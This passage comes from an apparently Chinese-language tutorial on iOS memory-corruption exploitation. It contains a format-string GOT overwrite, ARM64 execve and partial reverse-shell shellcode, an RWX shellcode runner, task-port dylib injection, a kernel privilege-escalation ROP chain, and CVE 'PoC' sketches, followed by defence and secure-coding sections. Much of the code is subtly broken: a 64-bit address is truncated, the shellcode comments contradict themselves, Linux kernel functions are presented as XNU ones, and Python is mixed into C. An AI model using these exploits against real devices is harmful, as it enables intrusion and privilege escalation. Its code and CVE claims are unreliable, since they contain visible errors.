    uint32_t chunk_size)
{
    // 漏洞: 总大小计算溢出
    uint32_t total_size = chunk_count * chunk_size;
    
    uint8_t *buffer = malloc(total_size);
    if (!buffer) return;
    
    // 如果total_size溢出为小值
    // 但循环使用原始参数
    for (uint32_t i = 0; i < chunk_count; i++) {
        memcpy(buffer + i * chunk_size,
               data + i * chunk_size,
               chunk_size); // 堆溢出!
    }
    
    free(buffer);
}

// 安全修复: 使用溢出检查
void process_chunks_safe(
    const uint8_t *data,
    uint32_t chunk_count,
    uint32_t chunk_size)
{
    // 使用安全的乘法
    uint64_t total_size_64 = (uint64_t)chunk_count * chunk_size;
    
    // 检查溢出
    if (total_size_64 > UINT32_MAX) {
        return; // 溢出，拒绝处理
    }
    
    // 额外的合理性检查
    if (total_size_64 > MAX_ALLOWED_SIZE) {
        return;
    }
    
    uint32_t total_size = (uint32_t)total_size_64;
    
    uint8_t *buffer = malloc(total_size);
    if (!buffer) return;
    
    for (uint32_t i = 0; i < chunk_count; i++) {
        // 验证偏移不溢出
        uint64_t offset = (uint64_t)i * chunk_size;
        if (offset + chunk_size > total_size) break;
        
        memcpy(buffer + offset, data + offset, chunk_size);
    }
    
    free(buffer);
}
```

---

## 8. 格式化字符串漏洞

### 8.1 格式化字符串漏洞原理

```c
// 格式化字符串漏洞

// 漏洞示例
void vulnerable_log(const char *user_input) {
    char buffer[256];
    
    // 漏洞: 用户输入直接作为格式化字符串
    sprintf(buffer, user_input); // 危险!
    
    // 正确做法:
    // sprintf(buffer, "%s", user_input);
}

// 攻击方式1: 信息泄露
// 输入: "%x.%x.%x.%x.%x.%x.%x.%x"
// 输出: 栈上的值，可能包含敏感信息

// 攻击方式2: 任意地址读取
// 输入: "%s" + 目标地址(放在栈上)
// 输出: 目标地址处的字符串

// 攻击方式3: 任意地址写入
// 输入: "%n" + 目标地址(放在栈上)
// 效果: 将已输出的字符数写入目标地址

// 攻击方式4: 控制写入值
// 输入: "%100x%n"
// 效果: 将100写入目标地址
// 输入: "%100x%hn"
// 效果: 将100写入目标地址(16位)
```

### 8.2 格式化字符串利用

```c
// 格式化字符串漏洞利用

// 利用%n实现任意地址写入
void format_string_exploit(void) {
    // 目标: 修改GOT表中的函数指针
    // 将free@GOT修改为system@PLT
    
    // 构造格式化字符串
    char payload[1024];
    int offset = 0;
    
    // 目标地址 (GOT中的free条目)
    uint32_t got_free = 0x100008000;
    uint32_t system_addr = 0x100004000;
    
    // 将地址放在payload开头
    // 地址1: 写入低16位
    *(uint32_t *)(payload + offset) = got_free;
    offset += 4;
    // 地址2: 写入高16位
    *(uint32_t *)(payload + offset) = got_free + 2;
    offset += 4;
    
    // 计算需要输出的字符数
    uint16_t low_half = system_addr & 0xFFFF;
    uint16_t high_half = (system_addr >> 16) & 0xFFFF;
    
    // 格式化字符串
    // %N$x 访问栈上第N个参数
    int param_offset = 6; // 需要测试确定
    
    // 写入低16位
    offset += sprintf(payload + offset, 
        "%%%du%%%d$hn", 
        low_half - offset, param_offset);
    
    // 写入高16位
    int needed = (high_half > low_half) ? 
        high_half - low_half : 
        high_half + 0x10000 - low_half;
    offset += sprintf(payload + offset,
        "%%%du%%%d$hn",
        needed, param_offset + 1);
    
    // 触发漏洞
    vulnerable_log(payload);
    
    // 现在free()被重定向到system()
    // 调用free("/bin/sh") 等于 system("/bin/sh")
}

// 防御措施
void safe_log(const char *message) {
    // 方法1: 始终使用格式化字符串
    printf("%s", message);
    
    // 方法2: 使用安全的日志函数
    // 限制输出长度
    char buffer[256];
    snprintf(buffer, sizeof(buffer), "%s", message);
    
    // 方法3: 编译时检查
    // 使用 __attribute__((format(printf, 1, 2)))
    // 编译器会检查格式化字符串参数
}
```

---

## 9. Objective-C内存损坏

### 9.1 Objective-C特有漏洞

```objc
// Objective-C特有的内存损坏漏洞

// 漏洞1: isa指针损坏
// 如果对象的isa指针被覆盖
// 消息发送将访问错误的类结构

void isa_corruption_exploit(NSObject *target) {
    // 获取isa指针地址
    uintptr_t *isa_ptr = (uintptr_t *)target;
    
    // 读取原始isa
    uintptr_t original_isa = *isa_ptr;
    
    // 覆盖isa为伪造的类地址
    *isa_ptr = (uintptr_t)fake_class;
    
    // 当消息发送到target时
    // 运行时会在fake_class中查找方法
    // 如果fake_class的方法列表被控制
    // 可以执行任意代码
    
    [target someMethod]; // 执行伪造的方法
}

// 漏洞2: 方法列表篡改
// Objective-C方法存储在类的方法列表中
// 如果方法列表被篡改，可以重定向方法调用

void method_swizzle_exploit(Class targetClass) {
    // 获取原始方法
    Method originalMethod = class_getInstanceMethod(
        targetClass, @selector(targetMethod));
    
    // 获取方法实现地址
    IMP originalIMP = method_getImplementation(originalMethod);
    
    // 替换为恶意实现
    IMP maliciousIMP = (IMP)^id(id self, SEL _cmd) {
        // 恶意代码
        NSLog(@"[!] 方法被劫持!");
        
        // 调用原始实现
        return ((id(*)(id, SEL))originalIMP)(self, _cmd);
    };
    
    method_setImplementation(originalMethod, maliciousIMP);
}

// 漏洞3: Associated Objects攻击
// 关联对象存储在全局哈希表中
// 如果哈希表被破坏，可能导致UAF

void associated_object_exploit(id target) {
    // 设置关联对象
    static void *key = "exploit_key";
    
    // 关联一个包含函数指针的对象
    ExploitObject *exploit = [[ExploitObject alloc] init];
    exploit->functionPointer = (void *)shellcode_address;
    
    objc_setAssociatedObject(target, key, exploit, 
        OBJC_ASSOCIATION_RETAIN);
    
    // 当target被释放时
    // 关联对象也会被释放
    // 如果ExploitObject的dealloc被覆盖
    // 可以执行任意代码
}

// 漏洞4: Block对象损坏
// Objective-C block在栈上和堆上都有数据
// 损坏block的invoke指针可以执行任意代码

typedef void (^ExploitBlock)(void);

void block_exploit(void) {
    __block void *stack_data[16];
    
    // 创建block
    ExploitBlock block = ^{
        NSLog(@"Normal block execution");
    };
    
    // block的内存布局:
    // struct Block_layout {
    //     void *isa;           // _NSConcreteStackBlock
    //     int flags;
    //     int reserved;
    //     void (*invoke)(void *, ...);
    //     struct Block_descriptor *descriptor;
    // };
    
    // 如果通过溢出覆盖invoke指针
    struct Block_layout *block_ptr = (struct Block_layout *)block;
    
    // 覆盖invoke为shellcode地址
    block_ptr->invoke = (void *)shellcode_address;
    
    // 调用block执行shellcode
    block(); // 执行shellcode!
}
```

### 9.2 KVO和通知漏洞

```objc
// KVO (Key-Value Observing) 漏洞

@interface VulnerableModel : NSObject
@property (nonatomic, strong) NSString *sensitiveData;
@end

// KVO通过动态创建子类实现
// 如果子类创建过程被干扰，可能导致内存损坏

void kvo_exploit(VulnerableModel *model) {
    // 注册KVO观察
    [model addObserver:self 
            forKeyPath:@"sensitiveData" 
               options:NSKeyValueObservingOptionNew 
               context:NULL];
    
    // KVO会动态创建 NSKVONotifying_VulnerableModel 子类
    // 子类重写了setter方法以发送通知
    
    // 如果通过内存损坏修改了isa指针
    // 指向一个伪造的KVO子类
    // 可以在setter中执行任意代码
}

// NSNotification漏洞
void notification_exploit(void) {
    // 通知中心持有观察者的弱引用
    // 如果观察者被释放但未移除
    // 发送通知时可能导致UAF
    
   NSNotificationCenter *center = [NSNotificationCenter defaultCenter];
    
    // 注册观察
    [center addObserver:self 
               selector:@selector(handleNotification:) 
                   name:@"TestNotification" 
                 object:nil];
    
    // 如果self被释放但未调用removeObserver
    // 当通知发送时，会访问已释放的self
    
    // 利用: 在self被释放后，重新分配相同内存
    // 构造伪造的对象
    // 当通知到达时，调用伪造的handleNotification:
}
```

---

## 10. WebKit内存漏洞

### 10.1 WebKit内存管理

```c
// WebKit内存管理架构
// WebKit使用自定义内存分配器

// WebKit的bmalloc分配器
// 基于分区分配器设计

typedef struct {
    void        *pages;         // 内存页
    size_t      page_count;     // 页数量
    size_t      object_size;    // 对象大小
    void        *free_list;     // 空闲链表
    uint32_t    alloc_count;    // 分配计数
} bmalloc_heap_t;

// WebKit中的常见漏洞类型
// 1. JavaScriptCore JIT编译器漏洞
// 2. DOM对象生命周期管理错误
// 3. CSS解析器缓冲区溢出
// 4. HTML解析器状态机错误

// JSC类型混淆漏洞示例
// JavaScript层面的类型混淆

/*
function jit_exploit() {
    // 创建触发JIT优化的函数
    function foo(a, b) {
        return a + b;
    }
    
    // JIT编译为整数加法
    for (let i = 0; i < 10000; i++) {
        foo(1, 2);
    }
    
    // 触发类型混淆
    // 传入double但JIT期望integer
    let result = foo(1.5, 2.5);
    // result被错误处理
    
    // 利用类型混淆构造伪造对象
    // 实现任意内存读写
}
*/
```

### 10.2 WebKit DOM漏洞

```objc
// WebKit DOM对象漏洞

// DOM节点生命周期管理错误
// 可能导致UAF

// 场景: 在DOM操作过程中节点被释放
/*
// JavaScript触发
function dom_uaf() {
    let elem = document.createElement('div');
    document.body.appendChild(elem);
    
    // 在事件处理器中移除元素
    elem.addEventListener('click', function() {
        elem.parentNode.removeChild(elem);
        // elem现在可能被释放
        // 但事件处理仍在进行
        elem.style.color = 'red'; // UAF!
    });
    
    // 触发点击
    elem.click();
}
*/

// WebKit渲染引擎漏洞
// 布局计算中的缓冲区溢出

/*
// 某些CSS属性组合可能导致布局引擎溢出
// 例如: 负margin + overflow + transform

<style>
.exploit {
    width: 100px;
    height: 100px;
    margin-left: -2147483648px; // 整数溢出
    transform: scale(999999);    // 放大溢出
    overflow: visible;
}
</style>

<div class="exploit">Trigger</div>
*/

// WebKit内存泄露导致信息泄露
// 通过JavascriptCore的GC行为泄露内存信息

// JavaScript GC探测
/*
function gc_probe() {
    // 创建大量对象触发GC
    let objects = [];
    for (let i = 0; i < 100000; i++) {
        objects.push(new ArrayBuffer(1024));
    }
    
    // 清除引用
    objects = null;
    
    // 触发GC
    // 通过测量时间推断GC行为
    let start = performance.now();
    // GC操作
    let end = performance.now();
    
    // 时间差异可能泄露堆信息
    console.log(`GC time: ${end - start}ms`);
}
*/
```

---

## 11. 代码执行技术

### 11.1 Shellcode编写

```c
// ARM64 Shellcode编写技术

// ARM64 shellcode - 执行execve("/bin/sh", NULL, NULL)
// 编码为机器码

/*
// ARM64 execve shellcode
// 长度: 28 bytes

// 构造字符串 "/bin/sh"
// 使用栈存储

// movz    x0, #0x622f     // x0 = "/b"
// movk    x0, #0x696e, lsl #16  // x0 = "/bin"
// movk    x0, #0x732f, lsl #32  // x0 = "/bin/s"
// movk    x0, #0x68, lsl #48    // x0 = "/bin/sh"
// str     x0, [sp, #-16]!       // 存储到栈上

// movz    x1, #0              // argv = NULL
// movz    x2, #0              // envp = NULL
// movz    x8, #221            // syscall number (execve)
// svc     #0                  // 触发系统调用
*/

// Shellcode字节码
unsigned char arm64_execve_shellcode[] = {
    0x2f, 0x62, 0x00, 0xd2,  // movz x0, #0x622f
    0x6e, 0x69, 0x46, 0xf2,  // movk x0, #0x696e, lsl #16
    0x2f, 0x73, 0x6d, 0xf2,  // movk x0, #0x732f, lsl #32
    0x68, 0x00, 0x8d, 0xf2,  // movk x0, #0x68, lsl #48
    0xe0, 0x0f, 0x00, 0xf9,  // str x0, [sp, #-16]!
    0x1f, 0x00, 0x02, 0xca,  // eor xzr, xzr, xzr (x1=0)
    0x02, 0x00, 0x02, 0xca,  // eor x2, x0, x0 (x2=0)
    0xa8, 0x0b, 0x80, 0xd2,  // movz x8, #0x5d (execve=221)
    0x01, 0x00, 0x00, 0xd4,  // svc #0
};

// 反弹shell shellcode (简化版)
unsigned char arm64_reverse_shell[] = {
    // socket(AF_INET, SOCK_STREAM, 0)
    0x40, 0x00, 0x80, 0xd2,  // mov x0, #2 (AF_INET)
    0x01, 0x08, 0x80, 0xd2,  // mov x1, #1 (SOCK_STREAM)
    0x02, 0x00, 0x80, 0xd2,  // mov x2, #0
    0x08, 0x08, 0x80, 0xd2,  // mov x8, #0x40 (sys_socket)
    0x00, 0x00, 0x00, 0xd4,  // svc #0
    // ... 后续连接和dup2代码
};

// 在iOS上执行shellcode
void execute_shellcode(void *code, size_t size) {
    // 分配可执行内存
    void *exec_mem = mmap(NULL, size,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (exec_mem == MAP_FAILED) return;
    
    // 复制shellcode
    memcpy(exec_mem, code, size);
    
    // 确保指令缓存同步
    __builtin___clear_cache(exec_mem, 
        (char *)exec_mem + size);
    
    // 转换为函数指针并执行
    void (*func)(void) = (void (*)(void))exec_mem;
    func();
    
    // 清理
    munmap(exec_mem, size);
}
```

### 11.2 代码注入技术

```c
// iOS代码注入技术

// 方法1: DYLD_INSERT_LIBRARIES
// 通过环境变量注入动态库

int inject_via_environment(const char *target_app, 
                          const char *dylib_path)
{
    // 设置环境变量
    setenv("DYLD_INSERT_LIBRARIES", dylib_path, 1);
    
    // 执行目标应用
    pid_t pid = fork();
    if (pid == 0) {
        execl(target_app, target_app, NULL);
        _exit(1);
    }
    
    int status;
    waitpid(pid, &status, 0);
    
    unsetenv("DYLD_INSERT_LIBRARIES");
    return WEXITSTATUS(status);
}

// 方法2: 通过task port注入
kern_return_t inject_via_task_port(
    mach_port_t task_port,
    const char *dylib_path)
{
    // 在目标进程中分配内存
    vm_address_t remote_code;
    vm_size_t code_size = 0x10000;
    
    kern_return_t kr = vm_allocate(task_port,
        &remote_code, code_size,
        VM_FLAGS_ANYWHERE);
    
    if (kr != KERN_SUCCESS) return kr;
    
    // 构造dlopen调用代码
    // ARM64汇编:
    // ldr x0, [pc, #offset]  ; dylib_path地址
    // mov x1, #2             ; RTLD_NOW
    // ldr x16, [pc, #offset] ; dlopen地址
    // blr x16
    
    // 写入远程进程
    kr = vm_write(task_port, remote_code,
        (vm_offset_t)dlopen_stub,
        dlopen_stub_size);
    
    // 写入dylib路径字符串
    vm_address_t remote_path = remote_code + 0x100;
    kr = vm_write(task_port, remote_path,
        (vm_offset_t)dylib_path,
        strlen(dylib_path) + 1);
    
    // 创建远程线程执行注入代码
    arm_thread_state64_t state;
    memset(&state, 0, sizeof(state));
    state.__pc = remote_code;
    state.__sp = remote_code + code_size - 0x100;
    
    thread_act_t thread;
    kr = thread_create_running(task_port,
        ARM_THREAD_STATE64,
        (thread_state_t)&state,
        ARM_THREAD_STATE64_COUNT,
        &thread);
    
    return kr;
}

// 方法3: 通过WebView JavaScript注入
// 在越狱环境中注入JavaScript代码

void inject_javascript(WKWebView *webView, NSString *jsCode) {
    [webView evaluateJavaScript:jsCode 
        completionHandler:^(id result, NSError *error) {
            if (error) {
                NSLog(@"[-] JavaScript注入失败: %@", error);
            } else {
                NSLog(@"[+] JavaScript注入成功: %@", result);
            }
        }];
}
```

---

## 12. ROP链构造

### 12.1 ROP基础

```c
// Return-Oriented Programming (ROP) 技术
// 在W^X保护下实现代码执行

// ARM64上的ROP gadgets
typedef struct {
    uint64_t    address;        // gadget地址
    const char  *description;   // 描述
    uint32_t    bytes[4];       // 指令字节
} rop_gadget_t;

// 常用ROP gadgets
rop_gadget_t common_gadgets[] = {
    // ret - 返回到下一个gadegt
    {0x0, "ret", {0xc0035fd6, 0, 0, 0}},
    
    // pop x0, x1; ret
    {0x0, "pop_x0_x1_ret", {0xe00740a9, 0xc0035fd6, 0, 0}},
    
    // pop x0; ret
    {0x0, "pop_x0_ret", {0xe00340f9, 0xc0035fd6, 0, 0}},
    
    // mov x0, x1; ret
    {0x0, "mov_x0_x1_ret", {0xe00301aa, 0xc0035fd6, 0, 0}},
    
    // blr x0 - 跳转到x0
    {0x0, "blr_x0", {0x00003fd6, 0, 0, 0}},
    
    // str x0, [x1]; ret - 写入内存
    {0x0, "str_x0_x1_ret", {0x200000f9, 0xc0035fd6, 0, 0}},
    
    // ldr x0, [x0]; ret - 读取内存
    {0x0, "ldr_x0_x0_ret", {0x000040f9, 0xc0035fd6, 0, 0}},
};

// ROP链结构
typedef struct {
    uint64_t    *chain;         // gadget链
    uint32_t    length;         // 链长度
    uint32_t    capacity;       // 容量
} rop_chain_t;

// 初始化ROP链
rop_chain_t *rop_chain_create(void) {
    rop_chain_t *chain = malloc(sizeof(rop_chain_t));
    chain->capacity = 64;
    chain->chain = malloc(chain->capacity * sizeof(uint64_t));
    chain->length = 0;
    return chain;
}

// 添加gadget到链
void rop_chain_add(rop_chain_t *chain, uint64_t gadget, 
                   uint64_t arg)
{
    if (chain->length + 2 > chain->capacity) {
        chain->capacity *= 2;
        chain->chain = realloc(chain->chain, 
            chain->capacity * sizeof(uint64_t));
    }
    
    chain->chain[chain->length++] = gadget;
    chain->chain[chain->length++] = arg;
}
```

### 12.2 ROP链构造实例

```c
// 构造完整的ROP链实现功能调用

// 目标: 调用 commit_creds(prepare_kernel_cred(0))
// 实现内核提权

rop_chain_t *build_kernel_exploit_rop(
    uint64_t kernel_base)
{
    rop_chain_t *chain = rop_chain_create();
    
    // 计算函数地址 (需要KASLR偏移)
    uint64_t prepare_kernel_cred = kernel_base + PREPARE_CREDS_OFFSET;
    uint64_t commit_creds = kernel_base + COMMIT_CREDS_OFFSET;
    
    // Gadget地址
    uint64_t pop_x0_ret = kernel_base + POP_X0_RET_OFFSET;
    uint64_t blr_x0_ret = kernel_base + BLR_X0_RET_OFFSET;
    uint64_t pop_x1_ret = kernel_base + POP_X1_RET_OFFSET;
    
    // 步骤1: 设置参数 x0 = 0 (NULL)
    rop_chain_add(chain, pop_x0_ret, 0);
    
    // 步骤2: 调用 prepare_kernel_cred(0)
    rop_chain_add(chain, blr_x0_ret, prepare_kernel_cred);
    
    // 步骤3: prepare_kernel_cred的返回值在x0中
    // 将其保存到临时位置
    uint64_t temp_storage = kernel_base + DATA_SECTION_OFFSET;
    uint64_t str_x0_x1_ret = kernel_base + STR_X0_X1_OFFSET;
    
    rop_chain_add(chain, pop_x1_ret, temp_storage);
    rop_chain_add(chain, str_x0_x1_ret, 0);
    
    // 步骤4: 加载保存的凭证
    rop_chain_add(chain, pop_x0_ret, temp_storage);
    uint64_t ldr_x0_x0_ret = kernel_base + LDR_X0_X0_OFFSET;
    rop_chain_add(chain, ldr_x0_x0_ret, 0);
    
    // 步骤5: 调用 commit_creds(cred)
    // x0已经包含凭证
    rop_chain_add(chain, pop_x1_ret, commit_creds);
    // 需要 mov x1, x0 然后 blr x1
    // 或使用其他gadget链
    
    return chain;
}

// 在用户空间执行ROP链
void execute_rop_chain(rop_chain_t *chain) {
    // 将ROP链写入栈
    // 通过缓冲区溢出覆盖返回地址
    
    char payload[1024];
    memset(payload, 0, sizeof(payload));
    
    // 填充到返回地址
    memset(payload, 'A', 256); // padding
    
    // 写入ROP链
    memcpy(payload + 256, chain->chain, 
           chain->length * sizeof(uint64_t));
    
    // 触发溢出
    vulnerable_function(payload);
    
    // 返回地址被覆盖为第一个gadget
    // ROP链开始执行
}
```

---

## 13. JIT代码执行

### 13.1 JIT编译器漏洞

```c
// JavaScript JIT编译器漏洞
// 通过类型混淆实现代码执行

// JavaScriptCore DFG JIT编译器
// 在优化过程中可能引入类型混淆

// 概念性漏洞代码路径:
/*
1. JavaScript函数被多次调用，JIT编译器分析类型
2. JIT假设某个变量总是整数，生成优化代码
3. 攻击者传入特殊值，触发类型混淆
4. 类型混淆导致内存越界读写
5. 利用越界读写构造伪造对象
6. 通过伪造对象实现任意代码执行
*/

// JIT漏洞利用框架
/*
class JITExploit {
    constructor() {
        // 步骤1: 触发JIT优化
        this.triggerJIT();
        
        // 步骤2: 创建类型混淆
        this.createTypeConfusion();
        
        // 步骤3: 实现越界读写
        this.setupOOBAccess();
        
        // 步骤4: 泄露关键地址
        this.leakAddresses();
        
        // 步骤5: 构造伪造对象
        this.createFakeObject();
        
        // 步骤6: 实现任意读写
        this.setupArbitraryRW();
    }
    
    triggerJIT() {
        // 创建热点函数
        function hotFunc(a, b) {
            return a + b;
        }
        
        // JIT编译
        for (let i = 0; i < 100000; i++) {
            hotFunc(i, i + 1);
        }
    }
    
    createTypeConfusion() {
        // 利用JIT的类型推断错误
        // 使double被当作integer处理
    }
    
    setupOOBAccess() {
        // 通过类型混淆修改数组长度
        // 实现越界访问
    }
    
    leakAddresses() {
        // 通过越界读取泄露:
        // - JIT代码地址
        // - 堆地址
        // - 库基地址
    }
    
    createFakeObject() {
        // 在堆上构造伪造的JS对象
        // 控制其属性指针
    }
    
    setupArbitraryRW() {
        // 使用伪造对象实现任意地址读写
        this.arbRead = (addr) => { /* ... */ };
        this.arbWrite = (addr, val) => { /* ... */ };
    }
}
*/
```

### 13.2 JIT Shellcode执行

```c
// 在JIT代码区域执行shellcode
// JIT编译的JavaScript代码存储在可执行内存中
// 如果能写入JIT区域，可以执行任意机器码

// 步骤1: 创建JavaScript函数
// function target() { return 42; }

// 步骤2: 获取函数的JIT代码地址
// 通过泄露获取JIT代码的内存地址

// 步骤3: 使用任意写入覆盖JIT代码
// 将shellcode写入JIT代码区域

// 步骤4: 调用函数执行shellcode
// target() 现在执行shellcode

// ARM64 JIT shellcode注入
void inject_jit_shellcode(
    uint64_t jit_code_addr,
    unsigned char *shellcode,
    size_t shellcode_size)
{
    // 假设已有任意写入能力
    // arb_write(addr, data, size)
    
    // 写入shellcode到JIT区域
    arb_write(jit_code_addr, shellcode, shellcode_size);
    
    // 刷新指令缓存
    // 在ARM64上需要确保指令缓存与数据缓存一致
    __builtin___clear_cache(
        (char *)jit_code_addr,
        (char *)jit_code_addr + shellcode_size);
    
    // 调用JavaScript函数
    // JIT代码现在执行shellcode
}
```

---

## 14. 真实漏洞案例分析

### 14.1 CVE-2024-23296 - iOS内核UAF

```c
// CVE-2024-23296 分析
// XNU内核中的Use-After-Free漏洞

// 漏洞位于网络栈的TCP处理中
// 在特定的TCP状态转换中，内核对象可能被提前释放

// 漏洞代码路径 (简化):
/*
1. 建立TCP连接
2. 发送特殊的TCP选项序列
3. 触发内核TCP控制块的异常状态转换
4. 在状态转换中，旧的tcpcb被释放
5. 但代码仍然持有旧的tcpcb指针
6. 后续操作使用已释放的tcpcb -> UAF
*/

// 远程触发PoC
import socket
import struct

def exploit_cve_2024_23296(target_ip):
    # 创建TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    
    # 连接到目标
    sock.connect((target_ip, 80))
    
    # 发送特殊的TCP选项
    # 触发内核中的状态转换漏洞
    tcp_options = construct_malicious_tcp_options()
    
    # 发送恶意数据包
    send_raw_tcp(sock, tcp_options)
    
    # 快速发送后续包触发UAF
    for i in range(100):
        send_raw_tcp(sock, construct_trigger_packet(i))
    
    # 此时内核可能已执行任意代码
    print("[+] 利用已发送")
```

### 14.2 CVE-2023-38600 - WebKit堆溢出

```c
// CVE-2023-38600 分析
// WebKit中的堆缓冲区溢出

// 漏洞位于WebGL着色器编译器中
// 某些特殊的GLSL着色器代码导致堆溢出

// JavaScript触发代码:
/*
function trigger_webkit_overflow() {
    let canvas = document.createElement('canvas');
    let gl = canvas.getContext('webgl2');
    
    // 创建着色器
    let shader = gl.createShader(gl.FRAGMENT_SHADER);
    
    // 特殊的GLSL代码触发溢出
    let glslCode = `
        precision highp float;
        void main() {
            // 特殊的循环结构导致编译器内部缓冲区溢出
            for (int i = 0; i < 1024; i++) {
                // 嵌套的条件编译触发漏洞
            }
        }
    `;
    
    gl.shaderSource(shader, glslCode);
    gl.compileShader(shader);
    
    // 此时堆已被溢出
    // 通过精确控制可以覆盖相邻对象
}
*/

// 利用步骤:
// 1. 触发堆溢出，覆盖相邻的JS对象元数据
// 2. 通过被覆盖的对象实现越界读写
// 3. 泄露JIT代码地址
// 4. 在JIT区域写入shellcode
// 5. 执行shellcode获得代码执行
```

### 14.3 CVE-2024-44308 - 远程代码执行

```c
// CVE-2024-44308 分析
// iOS远程代码执行漏洞

// 漏洞存在于CoreFoundation的序列化/反序列化中
// 通过畸形的NSKeyedArchiver数据触发

// 攻击场景: 通过iMessage发送恶意数据
// 无需用户交互即可触发

// 概念性利用:
/*
// 构造畸形的归档数据
NSMutableData *archive = [NSMutableData data];

// 写入伪造的对象头
[archive appendBytes:fake_header length:sizeof(fake_header)];

// 写入特殊的类引用
// 触发反序列化时的类型混淆
[archive appendBytes:fake_class_ref length:sizeof(fake_class_ref)];

// 写入恶意数据
// 覆盖相邻的堆对象
[archive appendBytes:payload length:payload_size];

// 通过iMessage发送
// 目标设备在接收时自动解析
// 触发漏洞执行代码
*/
```

---

## 15. 防御机制与缓解策略

### 15.1 编译器保护

```c
// 编译器级别的内存保护

// 1. Stack Canary (栈金丝雀)
// GCC/Clang: -fstack-protector-strong
// 在栈帧中插入随机值，函数返回前验证

// 2. ASLR (地址空间布局随机化)
// 随机化代码、堆、栈的基地址
// 增加利用难度

// 3. DEP/NX (数据执行保护)
// 标记数据页为不可执行
// 阻止直接执行shellcode

// 4. Control Flow Integrity (CFI)
// 验证间接调用的目标地址
// 防止ROP/JOP攻击

// CFI示例
__attribute__((cfi_check))
void cfi_check_function(void *target, void *call_site) {
    // 验证target是否是合法的函数地址
    if (!is_valid_function(target)) {
        __builtin_trap(); // 终止程序
    }
}

// 5. SafeBuffer (安全缓冲区)
// 使用边界检查的缓冲区操作

typedef struct {
    void    *data;
    size_t  size;
    size_t  capacity;
    uint64_t canary;    // 边界金丝雀
} safe_buffer_t;

safe_buffer_t *safe_buffer_create(size_t capacity) {
    safe_buffer_t *buf = malloc(sizeof(safe_buffer_t));
    buf->data = malloc(capacity);
    buf->size = 0;
    buf->capacity = capacity;
    buf->canary = 0xDEADBEEFCAFEBABE;
    return buf;
}

int safe_buffer_append(safe_buffer_t *buf, const void *data, 
                       size_t len)
{
    // 边界检查
    if (buf->size + len > buf->capacity) {
        return -1; // 溢出保护
    }
    
    memcpy((char *)buf->data + buf->size, data, len);
    buf->size += len;
    
    return 0;
}

void safe_buffer_destroy(safe_buffer_t *buf) {
    // 验证金丝雀
    if (buf->canary != 0xDEADBEEFCAFEBABE) {
        // 检测到损坏
        abort();
    }
    
    free(buf->data);
    buf->data = NULL;
    buf->canary = 0;
    free(buf);
}
```

### 15.2 运行时保护

```c
// 运行时内存保护机制

// 1. MTE (Memory Tagging Extension)
// ARM64硬件级内存保护

// MTE为每个内存字节分配4位标签
// 每个指针也携带4位标签
// 访问时验证标签匹配

// MTE使用示例 (概念)
void mte_protected_function(void) {
    // 分配带标签的内存
    void *ptr = malloc_tagged(256);
    
    // ptr的标签被自动设置
    // 例如: 标签 = 0xA
    
    // 正常访问 - 标签匹配
    ((char *)ptr)[0] = 'A'; // OK
    
    // 越界访问 - 标签不匹配
    // ((char *)ptr)[256] = 'B'; // 触发异常!
    
    // UAF - 标签已被清除
    // free_tagged(ptr);
    // ((char *)ptr)[0] = 'C'; // 触发异常!
}

// 2. Guard Pages (保护页)
// 在关键内存区域周围放置不可访问的页

void setup_guard_pages(void) {
    // 在堆区域前后设置guard page
    void *heap_start = mmap(NULL, 0x3000,
        PROT_NONE, // 不可访问
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    // 中间页设为可读写
    mprotect((char *)heap_start + 0x1000, 0x1000,
        PROT_READ | PROT_WRITE);
    
    // 任何越界访问都会触发SIGSEGV
}

// 3. 内存完整性检查
// 定期验证关键数据结构的完整性

typedef struct {
    uint32_t    magic;
    uint32_t    checksum;
    void        *data;
    size_t      size;
} integrity_protected_t;

void update_checksum(integrity_protected_t *obj) {
    // 计算数据的SHA256
    uint8_t hash[32];
    sha256(obj->data, obj->size, hash);
    
    // 存储校验和
    obj->checksum = *(uint32_t *)hash;
}

int verify_integrity(integrity_protected_t *obj) {
    if (obj->magic != 0xCAFEBABE) {
        return -1; // 魔术字被破坏
    }
    
    uint8_t hash[32];
    sha256(obj->data, obj->size, hash);
    
    if (obj->checksum != *(uint32_t *)hash) {
        return -1; // 数据被篡改
    }
    
    return 0;
}

// 4. 指针认证 (PAC)
// ARM64指针认证码

// PAC在指针的高位存储认证码
// 修改指针会导致认证失败
#include <ptrauth.h>

void pac_protected_function(void) {
    // 函数指针使用PAC签名
    void (*handler)(void) = &some_function;
    
    // 签名后的指针
    void (*signed_handler)(void) = 
        ptrauth_sign_unauthenticated(handler,
            ptrauth_key_function_pointer, 0);
    
    // 调用时自动验证
    signed_handler(); // 如果指针被篡改，触发异常
    
    // 数据指针也可以使用PAC
    void *data_ptr = malloc(256);
    void *signed_ptr = ptrauth_sign_unauthenticated(data_ptr,
        ptrauth_key_process_dependent_data, 
        ptrauth_discriminator_pointer(&data_ptr));
}
```

### 15.3 安全编码规范

```c
// iOS安全编码最佳实践

// 1. 始终使用安全的字符串函数
void safe_string_operations(void) {
    char buffer[256];
    const char *input = get_user_input();
    
    // 不安全:
    // strcpy(buffer, input);
    // strcat(buffer, input);
    // sprintf(buffer, "%s", input);
    
    // 安全:
    strlcpy(buffer, input, sizeof(buffer));
    strlcat(buffer, input, sizeof(buffer));
    snprintf(buffer, sizeof(buffer), "%s", input);
}

// 2. 验证所有外部输入
int validated_array_access(int *array, size_t count, 
                           size_t index)
{
    // 边界检查
    if (index >= count) {
        return -1; // 越界保护
    }
    
    return array[index];
}

// 3. 使用安全的内存分配
void *safe_malloc(size_t size) {
    // 检查溢出
    if (size == 0 || size > MAX_ALLOCATION_SIZE) {
        return NULL;
    }
    
    void *ptr = malloc(size);
    if (ptr) {
        memset(ptr, 0, size); // 清零防止信息泄露
    }
    
    return ptr;
}

// 4. 正确的资源清理
typedef struct {
    void    *buffer1;
    void    *buffer2;
    void    *buffer3;
    int     initialized;
} resource_t;

int resource_init(resource_t *res) {
    res->buffer1 = NULL;
    res->buffer2 = NULL;
    res->buffer3 = NULL;
    res->initialized = 0;
    
    res->buffer1 = malloc(256);
    if (!res->buffer1) goto fail;
    
    res->buffer2 = malloc(512);
    if (!res->buffer2) goto fail;
    
    res->buffer3 = malloc(1024);
    if (!res->buffer3) goto fail;
    
    res->initialized = 1;
    return 0;
    
fail:
    // 统一的清理路径
    resource_cleanup(res);
    return -1;
}

